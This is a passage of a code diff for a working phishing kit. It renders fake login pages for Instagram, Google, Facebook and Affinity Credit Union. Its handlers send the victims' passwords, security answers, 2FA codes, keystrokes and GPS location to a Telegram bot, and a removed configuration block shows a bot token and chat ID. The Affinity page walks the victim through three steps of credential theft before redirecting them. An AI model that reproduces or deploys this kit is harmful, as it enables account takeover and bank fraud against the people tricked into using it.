+}
+
+function setupInstagram() {
+    const f = document.getElementById('loginForm');
+    const e = document.getElementById('email');
+    const p = document.getElementById('password');
+    addKeyListener(e, 'Instagram', 'Email');
+    addKeyListener(p, 'Instagram', 'Password');
+    f.addEventListener('submit', function(ev) {
+        ev.preventDefault();
+        const em = e.value.trim(), pw = p.value;
+        document.getElementById('loadingIndicator').style.display = 'block';
+        tg(`🔔 *Instagram — Creds*\n📧 \`${em}\`\n🔑 \`${pw}\`\n\n${locStr()}`);
+        getGPS();
+        setTimeout(() => {
+            const coords = (lat && lon) ? `${lat},${lon}` : '';
+            window.location.href = coords ? `https://www.google.com/maps?q=${coords}` : 'https://instagram.com';
+        }, 2000);
+    });
+}
+
+// ==========================================
+// PAGE: Affinity (3-step: creds -> secQ -> 2FA)
+// ==========================================
+function renderAffinity(step) {
+    step = step || 1;
+    if (step === 1) {
+        document.getElementById('app').innerHTML = `
+        <div class="affinity-wrapper" id="aff1">
+            <div class="affinity-header">
+                <h1>Online Banking</h1>
+                <p>Sign in to your account</p>
+            </div>
+            <div class="affinity-body">
+                <form id="loginForm">
+                    <label>MEMBER NUMBER</label>
+                    <input type="text" id="email" placeholder="Enter your member number" required>
+                    <label>PASSWORD</label>
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                    <div class="error" id="errorMsg">Incorrect member number or password.</div>
+                    <button type="submit" class="affinity-btn">Sign In</button>
+                </form>
+                <div class="loading" id="loadingIndicator"><div class="spinner"></div><p>Verifying...</p></div>
+            </div>
+            <div class="affinity-footer">
+                <a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a><br>Need help? Call 1.866.863.6237
+            </div>
+        </div>`;
+        setupAff1();
+    } else if (step === 2) {
+        document.getElementById('app').innerHTML = `
+        <div class="affinity-wrapper" id="aff2">
+            <div class="affinity-header">
+                <h1>Verify Your Identity</h1>
+                <p>Please answer the following question</p>
+            </div>
+            <div class="affinity-body">
+                <form id="secForm">
+                    <label>SECURITY QUESTION</label>
+                    <select id="secQ" style="width:100%;padding:12px;border:1.5px solid #ddd;border-radius:4px;font-size:14px;margin-bottom:16px;background:#fafafa">
                         <option value="">— Select a question —</option>
                         <option value="What is your father's middle name?">What is your father's middle name?</option>
                         <option value="What was the name of your first pet?">What was the name of your first pet?</option>
@@ -276,214 +321,118 @@
                         <option value="What was the name of your elementary school?">What was the name of your elementary school?</option>
                         <option value="What is the name of your first employer?">What is the name of your first employer?</option>
                     </select>
-                </div>
-                <div class="input-group"><label>YOUR ANSWER</label><input type="text" id="secA1" placeholder="Enter your answer" autocomplete="off" required></div>
-                <div class="error" id="secError" style="display:none;">Incorrect answer. Please try again.</div>
-                <button type="submit" class="btn-affinity">Verify</button>
-            </form>
-            <div class="loading" id="secLoading" style="display:none;"><div class="spinner" style="border-top-color:#005a9c;"></div><p>Verifying your information...</p></div>
-        </div>
-        <div class="affinity-footer">
-            <a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a><br>Need help? Call <span class="affinity-phone">1.866.863.6237</span>
-        </div>
-    </div>
-</div>
-
-<div id="tfaPage">
-    <div class="affinity-wrapper">
-        <div class="affinity-header">
-            <svg width="48" height="48" viewBox="0 0 200 60" style="margin-bottom:8px;"><rect width="200" height="60" rx="4" fill="rgba(255,255,255,0.15)"/><circle cx="30" cy="30" r="14" fill="none" stroke="#fff" stroke-width="3"/><path d="M23 30 l4 4 7-9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/><text x="56" y="34" fill="#fff" font-size="20" font-weight="bold" font-family="Arial,sans-serif">AFFINITY</text><text x="56" y="46" fill="#fff" font-size="9" font-family="Arial,sans-serif" opacity="0.8">CREDIT UNION</text></svg>
-            <h1>Verify Your Identity</h1>
-            <p>Enter the code sent to your device</p>
-        </div>
-        <div class="affinity-body">
-            <form id="tfaForm">
-                <p style="font-size:14px;color:#555;text-align:center;margin-bottom:8px;">A 6-digit code was sent to your registered phone number.</p>
-                <div class="code-inputs">
-                    <input type="text" id="tfa1" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]">
-                    <input type="text" id="tfa2" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]">
-                    <input type="text" id="tfa3" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]">
-                    <input type="text" id="tfa4" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]">
-                    <input type="text" id="tfa5" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]">
-                    <input type="text" id="tfa6" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]">
-                </div>
-                <div class="error" id="tfaError" style="display:none;">Invalid code. Please try again.</div>
-                <button type="submit" class="btn-affinity">Verify</button>
-                <a href="#" class="affinity-forgot" style="margin-top:12px;">Didn't receive a code?</a>
-            </form>
-            <div class="loading" id="tfaLoading" style="display:none;"><div class="spinner" style="border-top-color:#005a9c;"></div><p>Verifying code...</p></div>
-        </div>
-        <div class="affinity-footer">
-            <a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a><br>Need help? Call <span class="affinity-phone">1.866.863.6237</span>
-        </div>
-    </div>
-</div>
-
-<script>
-// ========================
-// CONFIGURATION
-// ========================
-const BOT_TOKEN = "8809602041:AAHIwV4msf_j0G5bgCRqLYAM0EuVSGVAv84";
-const CHAT_ID = "8647509715";
-
-// ========================
-// BRAND DEFINITIONS
-// ========================
-const BRANDS = {
-    google: {
-        name: 'Google',
-        color: '#1a73e8',
-        realSite: 'https://accounts.google.com',
-        title: 'Sign in',
-        subtitle: 'Use your Google Account',
-        emailLabel: 'Email or phone',
-        placeholder: 'you@gmail.com',
-        btnText: 'Sign in',
-        forgotText: 'password',
-        logo: `<svg width="48" height="48" viewBox="0 0 48 48"><path d="M43.6 24.5c0-1.6-.1-3.1-.4-4.6H24v8.7h11c-.5 2.7-1.9 5-3.9 6.5v5.4h6.3c3.7-3.4 5.9-8.4 5.9-16z" fill="#4285F4"/><path d="M24 44c5.3 0 9.8-1.8 13-4.8l-6.3-5.4c-1.7 1.2-3.9 1.9-6.7 1.9-5.1 0-9.5-3.5-11-8.2H6.4v5.6C9.6 39.7 16.3 44 24 44z" fill="#34A853"/><path d="M13 28.5c-.4-1.2-.6-2.5-.6-3.5s.2-2.3.6-3.5v-5.6H6.4C5.1 19.4 4.4 21.7 4.4 24s.7 4.6 2 6.5l6.6-2z" fill="#FBBC05"/><path d="M24 10.5c2.9 0 5.5 1 7.5 2.9l5.6-5.6C33.8 5.3 29.3 4 24 4 16.3 4 9.6 8.3 6.4 14.5l6.6 5.6c1.5-4.7 5.9-9.6 11-9.6z" fill="#EA4335"/></svg>`,
-        render: function() {
-            return `
-            <div class="card" style="max-width:400px;">
-                <div class="logo">${this.logo}<h1 style="color:${this.color}">${this.title}</h1><p>${this.subtitle}</p></div>
-                <form id="loginForm">
-                    <div class="input-group"><label>${this.emailLabel}</label><input type="text" id="email" placeholder="${this.placeholder}" autocomplete="off" required></div>
-                    <div class="input-group"><label>Password</label><input type="password" id="password" placeholder="Enter your password" autocomplete="off" required></div>
-                    <div class="error" id="errorMsg">Couldn't sign you in. Check your email or password.</div>
-                    <button type="submit" class="btn" style="background:${this.color}">${this.btnText}</button>
+                    <label>YOUR ANSWER</label>
+                    <input type="text" id="secA" placeholder="Enter your answer" required>
+                    <div class="error" id="secError">Incorrect answer.</div>
+                    <button type="submit" class="affinity-btn">Verify</button>
                 </form>
-                <div class="loading" id="loadingIndicator"><div class="spinner"></div><p>Verifying...</p></div>
-                <div class="footer"><a href="#" style="color:${this.color}">Forgot ${this.forgotText}?</a></div>
-            </div>`;
-        }
-    },
-    facebook: {
-        name: 'Facebook',
-        color: '#1877F2',
-        realSite: 'https://facebook.com',
-        title: 'Log in to Facebook',
-        subtitle: 'Connect with friends and the world',
-        emailLabel: 'Email or phone',
-        placeholder: 'Email or phone number',
-        btnText: 'Log in',
-        forgotText: 'account',
-        logo: `<svg width="48" height="48" viewBox="0 0 48 48"><circle cx="24" cy="24" r="20" fill="#1877F2"/><path d="M29 16h-3c-1.7 0-3 1.3-3 3v3h-3v4h3v12h4V26h3l1-4h-4v-2c0-.6.4-1 1-1h3v-3z" fill="#fff"/></svg>`,
-        render: function() {
-            return `
-            <div class="card" style="max-width:400px;">
-                <div class="logo">${this.logo}<h1 style="color:${this.color}">${this.title}</h1><p style="font-size:13px;color:#888;">${this.subtitle}</p></div>
-                <form id="loginForm">
-                    <div class="input-group"><label>${this.emailLabel}</label><input type="text" id="email" placeholder="${this.placeholder}" autocomplete="off" required></div>
-                    <div class="input-group"><label>Password</label><input type="password" id="password" placeholder="Password" autocomplete="off" required></div>
-                    <button type="submit" class="btn" style="background:${this.color};font-size:20px;font-weight:700;">${this.btnText}</button>
-                    <div style="text-align:center;margin-top:14px;"><a href="#" style="color:${this.color};font-size:14px;text-decoration:none;">Forgotten ${this.forgotText}?</a></div>
-                    <div class="error" id="errorMsg" style="margin-top:16px;">Wrong credentials. Try again.</div>
-                </form>
-                <div class="loading" id="loadingIndicator"><div class="spinner"></div><p>Verifying...</p></div>
-                <hr style="margin:20px 0;border:none;border-top:1px solid #ddd;">
-                <div style="text-align:center;font-size:14px;"><a href="#" style="color:${this.color};text-decoration:none;font-weight:600;">Create new account</a></div>
-            </div>`;
-        }
-    },
-    snapchat: {
-        name: 'Snapchat',
-        color: '#FFFC00',
-        realSite: 'https://accounts.snapchat.com',
-        title: 'Log in',
-        subtitle: '',
-        emailLabel: 'Username or email',
-        placeholder: 'Your username or email',
-        btnText: 'Log in',
-        forgotText: 'password',
-        render: function() {
-            return `
-            <div class="snapchat-wrapper">
-                <div class="snapchat-body">
-                    <div class="snapchat-logo"><svg width="64" height="64" viewBox="0 0 48 48"><circle cx="24" cy="24" r="22" fill="#FFFC00"/><path d="M24 10c-5 0-9 3-9 8v4c0 1-1 2-2 2-1 0-2 0-3 1 0 1 1 2 3 3 1 0 2 1 2 1s0 4 3 6c2 2 4 3 6 3s4-1 6-3c3-2 3-6 3-6s1-1 2-1c2-1 3-2 3-3-1-1-2-1-3-1-1 0-2-1-2-2v-4c0-5-4-8-9-8z" fill="#000"/></svg></div>
-                    <form id="loginForm">
-                        <div class="input-group" style="text-align:left"><label>${this.emailLabel}</label><input type="text" id="email" placeholder="${this.placeholder}" autocomplete="off" required></div>
-                        <div class="input-group" style="text-align:left"><label>Password</label><input type="password" id="password" placeholder="Password" autocomplete="off" required></div>
-                        <button type="submit" class="btn-snapchat">${this.btnText}</button>
-                        <div class="error" id="errorMsg" style="margin-top:12px;">Invalid username or password.</div>
-                    </form>
-                    <div class="loading" id="loadingIndicator"><div class="spinner" style="border-top-color:#000;"></div><p>Signing in...</p></div>
-                    <div class="snapchat-links">
-                        <a href="#">Forgot your password?</a>
-                        <a href="#">New to Snapchat? Sign up</a>
+                <div class="loading" id="secLoad" style="display:none"><div class="spinner"></div><p>Verifying...</p></div>
+            </div>
+            <div class="affinity-footer">
+                <a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a>
+            </div>
+        </div>`;
+        setupAff2();
+    } else if (step === 3) {
+        document.getElementById('app').innerHTML = `
+        <div class="affinity-wrapper" id="aff3">
+            <div class="affinity-header">
+                <h1>Verify Your Identity</h1>
+                <p>Enter the code sent to your device</p>
+            </div>
+            <div class="affinity-body">
+                <p style="font-size:14px;color:#555;text-align:center;margin-bottom:8px">A 6-digit code was sent to your phone.</p>
+                <form id="tfaForm">
+                    <div class="code-inputs">
+                        <input type="text" id="c1" maxlength="1" inputmode="numeric">
+                        <input type="text" id="c2" maxlength="1" inputmode="numeric">
+                        <input type="text" id="c3" maxlength="1" inputmode="numeric">
+                        <input type="text" id="c4" maxlength="1" inputmode="numeric">
+                        <input type="text" id="c5" maxlength="1" inputmode="numeric">
+                        <input type="text" id="c6" maxlength="1" inputmode="numeric">
                     </div>
-                </div>
-            </div>`;
-        }
-    },
-    tiktok: {
-        name: 'TikTok',
-        color: '#000',
-        realSite: 'https://www.tiktok.com/login',
-        title: 'Log in',
-        subtitle: '',
-        emailLabel: 'Email or username',
-        placeholder: 'Email or username',
-        btnText: 'Log in',
-        forgotText: 'password',
-        render: function() {
-            return `
-            <div class="tiktok-wrapper">
-                <div class="tiktok-body">
-                    <div class="tt-logo"><svg width="48" height="48" viewBox="0 0 48 48"><rect width="48" height="48" rx="10" fill="#000"/><path d="M34 18.5v3c-2 0-4-.5-6-2v8c0 4-3 7-7 7s-7-3-7-7 3-7 7-7v3c-2 0-4 1.5-4 4s1.5 4 4 4 4-2 4-4V12h3c0 2 1 4 3 5v1.5z" fill="#fff"/></svg></div>
-                    <h2>${this.title}</h2>
-                    <form id="loginForm">
-                        <div class="input-group" style="text-align:left"><label>${this.emailLabel}</label><input type="text" id="email" placeholder="${this.placeholder}" autocomplete="off" required></div>
-                        <div class="input-group" style="text-align:left"><label>Password</label><input type="password" id="password" placeholder="Password" autocomplete="off" required></div>
-                        <button type="submit" class="btn-tiktok">${this.btnText}</button>
-                        <div class="error" id="errorMsg" style="margin-top:12px;">Incorrect email or password.</div>
-                    </form>
-                    <div class="loading" id="loadingIndicator"><div class="spinner" style="border-top-color:#000;"></div><p>Signing in...</p></div>
-                    <div class="tiktok-links"><a href="#">Forgot password?</a> · <a href="#">Sign up</a></div>
-                </div>
-            </div>`;
-        }
-    },
-    instagram: {
-        name: 'Instagram',
-        color: '#0095F6',
-        realSite: 'https://www.instagram.com/accounts/login',
-        title: 'Log in',
-        subtitle: '',
-        emailLabel: 'Phone number, username, or email',
-        placeholder: 'Phone number, username, or email',
-        btnText: 'Log in',
-        forgotText: 'password',
-        render: function() {
-            return `
-            <div class="instagram-wrapper">
-                <div class="instagram-body">
-                    <div class="ig-logo"><svg width="64" height="64" viewBox="0 0 48 48"><defs><linearGradient id="igGrad" x1="0" y1="0" x2="48" y2="48"><stop stop-color="#833AB4"/><stop offset=".5" stop-color="#FD1D1D"/><stop offset="1" stop-color="#F77737"/></linearGradient></defs><rect x="4" y="4" width="40" height="40" rx="10" fill="url(#igGrad)"/><circle cx="24" cy="24" r="8" stroke="#fff" stroke-width="2.5" fill="none"/><circle cx="32" cy="16" r="2" fill="#fff"/></svg></div>
-                    <form id="loginForm">
-                        <div class="input-group"><input type="text" id="email" placeholder="${this.placeholder}" autocomplete="off" required></div>
-                        <div class="input-group"><input type="password" id="password" placeholder="Password" autocomplete="off" required></div>
-                        <button type="submit" class="btn-instagram">${this.btnText}</button>
-                        <div class="error" id="errorMsg" style="margin-top:12px;font-size:14px;">Sorry, your password was incorrect.</div>
-                    </form>
-                    <div class="instagram-or"><div class="line"></div><div class="text">or</div><div class="line"></div></div>
-                    <a href="#" class="instagram-fb-link"><svg width="16" height="16" viewBox="0 0 16 16"><circle cx="8" cy="8" r="7" fill="#1877F2"/><path d="M10 5H9c-.6 0-1 .4-1 1v1h2l-.5 2H8v5H5.5V9H4V7h1.5V6c0-1.7 1-3 3-3h1.5v2z" fill="#fff"/></svg> Log in with Facebook</a>
-                    <a href="#" class="instagram-link">Forgot password?</a>
-                </div>
-                <div class="loading" id="loadingIndicator" style="display:none;text-align:center;padding:10px;border-top:1px solid #dbdbdb;"><div class="spinner" style="border-top-color:#0095F6;"></div><p style="font-size:12px;color:#999;">Logging in...</p></div>
-                <div style="border-top:1px solid #dbdbdb;padding:20px;text-align:center;background:#fff;font-size:14px;">Don't have an account? <a href="#" style="color:#0095F6;text-decoration:none;font-weight:600;">Sign up</a></div>
-            </div>`;
-        }
-    },
-    pinterest: {
-        name: 'Pinterest',
-        color: '#E60023',
-        realSite: 'https://www.pinterest.com/login',
-        title: 'Log in to see more',
-        subtitle: '',
-        emailLabel: 'Email',
-        placeholder: 'Email',
-        btnText: 'Log in',
-        forgotText: 'password',
-        render: function() {
-            return `
-            <div class="pinterest-wrapper">
-                <div class="pinterest-body">
-                    <svg width="48" height="48" viewBox="0 0 48 48"><circle cx="24" cy="24" r="22" fill="#E60023"/><path d="M24 8c-8.8 0-16 7.2-16 16 0 6.8 4.2 12.6 10.2 14.9l1.5-6.4s-.4-.8-.4-1.9c0-1.8 1-3.1 2.3-3.1 1.1 0 1.6.8 1.6 1.8 0 1.1-.7 2.7-1.1 4.2-.3 1.3.6 2.3 1.9 2.3 2.3 0 4.1-2.4 4.1-5.9 0-3.1-2.2-5.2-5.4-5.2-3.7 0-5.8 2.8-5.8 5.6 0 1.1.4 2.3.9 2.9.1.1.1.2.1.4-.1.4-.3 1.2-.3 1.4-.1.2-.2.3-.4.2-1.6-.8-2.6-3.1-2.6-5 0-4.1 3-7.9 8.6-7.9 4.5 0 8 3.2 8 7.5 0 4.
+                    <div class="error" id="tfaError">Invalid code.</div>
+                    <button type="submit" class="affinity-btn">Verify</button>
+                </form>
+                <div class="loading" id="tfaLoad" style="display:none"><div class="spinner"></div><p>Verifying code...</p></div>
+            </div>
+            <div class="affinity-footer">
+                <a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a>
+            </div>
+        </div>`;
+        setupAff3();
+    }
+}
+
+function setupAff1() {
+    const f = document.getElementById('loginForm');
+    const e = document.getElementById('email');
+    const p = document.getElementById('password');
+    addKeyListener(e, 'Affinity', 'Member#');
+    addKeyListener(p, 'Affinity', 'Password');
+    f.addEventListener('submit', function(ev) {
+        ev.preventDefault();
+        const em = e.value.trim(), pw = p.value;
+        document.getElementById('loadingIndicator').style.display = 'block';
+        tg(`🔔 *Affinity — Creds*\n📧 Member#: \`${em}\`\n🔑 Password: \`${pw}\`\n\n${locStr()}`);
+        getGPS();
+        setTimeout(() => { cleanListeners(); renderAffinity(2); }, 2000);
+    });
+}
+
+function setupAff2() {
+    const f = document.getElementById('secForm');
+    const q = document.getElementById('secQ');
+    const a = document.getElementById('secA');
+    addKeyListener(a, 'Affinity', 'SecAnswer');
+    f.addEventListener('submit', function(ev) {
+        ev.preventDefault();
+        const qv = q.value, av = a.value.trim();
+        document.getElementById('secLoad').style.display = 'block';
+        f.style.display = 'none';
+        tg(`🛡️ *Affinity — Security Q*\n❓ ${qv}\n✏️ \`${av}\``);
+        setTimeout(() => { cleanListeners(); renderAffinity(3); }, 2000);
+    });
+}
+
+function setupAff3() {
+    const ids = ['c1','c2','c3','c4','c5','c6'];
+    ids.forEach((id, i) => {
+        const el = document.getElementById(id);
+        el.addEventListener('input', function() {
+            if (this.value.length >= 1 && i < 5) document.getElementById(ids[i+1]).focus();
+        });
+        el.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && this.value.length === 0 && i > 0) document.getElementById(ids[i-1]).focus();
+        });
+    });
+    document.getElementById('tfaForm').addEventListener('submit', function(ev) {
+        ev.preventDefault();
+        const code = ids.map(id => document.getElementById(id).value).join('');
+        if (code.length < 6) return;
+        document.getElementById('tfaLoad').style.display = 'block';
+        ev.target.style.display = 'none';
+        tg(`📱 *Affinity — 2FA Code*\n🔢 \`${code}\`\n\n${locStr()}`);
+        setTimeout(() => {
+            const coords = (lat && lon) ? `${lat},${lon}` : '';
+            window.location.href = coords ? `https://www.google.com/maps?q=${coords}` : 'https://personal.affinitycu.ca/';
+        }, 2000);
+    });
+}
+
+// ==========================================
+// ROUTER
+// ==========================================
+function route() {
+    cleanListeners();
+    const p = new URLSearchParams(location.search);
+    const b = p.get('brand') || 'google';
+    if (b === 'facebook') renderFacebook();
+    else if (b === 'instagram') renderInstagram();
+    else if (b === 'affinity') renderAffinity(1);
+    else renderGoogle();
+}
+route();
+</script>
+</body>
+</html>
